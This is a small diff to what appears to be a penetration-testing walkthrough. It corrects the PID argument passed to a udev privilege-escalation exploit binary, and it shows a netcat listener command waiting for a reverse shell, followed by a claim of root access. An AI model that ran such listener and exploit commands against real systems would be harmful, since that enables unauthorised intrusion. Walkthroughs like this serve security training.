@@ -770,7 +770,7 @@ nc -nlvp 4445
 Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.
 
 ```
-./8572 2740
+./8572 2739
 ```
 
 We have root!
